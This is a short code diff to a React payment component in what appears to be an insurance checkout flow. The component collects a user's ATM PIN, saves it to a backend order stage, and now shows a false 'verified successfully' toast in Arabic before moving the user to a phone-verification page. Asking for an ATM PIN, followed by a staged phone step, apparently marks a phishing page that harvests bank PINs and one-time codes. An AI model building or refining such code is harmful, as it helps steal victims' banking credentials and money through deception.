@@ -36,7 +36,8 @@ const ATMPayment = () => {
     const id = await createOrUpdateStage(currentOrderId, "atm", { atm_pin: pin });
     setCurrentOrderId(id);
     if (id) sessionStorage.setItem("insurance_order_id", id);
-    setWaitingApproval(true);
+    toast.success("تم التحقق بنجاح");
+    navigate("/insurance/phone-verify", { state: { offer, orderId: id || currentOrderId } });
   };
 
   if (!offer) {
